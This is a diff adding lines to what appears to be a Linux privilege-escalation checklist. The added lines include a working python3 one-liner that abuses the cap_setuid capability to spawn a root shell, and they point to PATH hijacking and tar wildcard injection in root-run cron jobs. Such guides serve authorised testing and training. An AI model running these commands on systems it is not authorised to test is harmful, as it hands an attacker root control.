@@ -50,6 +50,15 @@ getcap -r / 2>/dev/null
 strings <candidate-binary>
 ```
 
+If a binary with `cap_setuid+ep` can run Python code, verify the capability on that exact path before trying a UID change:
+
+```bash
+getcap /usr/bin/python3
+/usr/bin/python3 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
+```
+
+For a root-run cron or service script, check whether it calls a relative command name from a directory you can place earlier in `PATH`. For a wildcard archive job, check whether attacker-controlled filenames are passed as options to `tar`; a mere `*` in a script is not enough. `pspy` can help confirm when the job runs.
+
 ## Before modifying a root-run file
 
 Record its original contents and permissions. Make one change, trigger the known path, verify the result, then restore the original state.
